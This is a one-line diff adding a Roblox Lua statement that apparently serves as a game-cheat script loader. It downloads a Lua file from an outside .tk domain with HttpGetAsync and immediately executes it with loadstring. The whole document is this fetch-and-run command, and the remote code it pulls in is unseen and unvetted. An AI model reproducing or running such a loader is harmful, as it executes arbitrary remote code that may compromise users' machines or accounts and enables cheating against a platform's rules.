@@ -1,0 +1,1 @@
+loadstring(game:HttpGetAsync("https://argetnarhub.tk/raw/RunStarSim.lua"))()
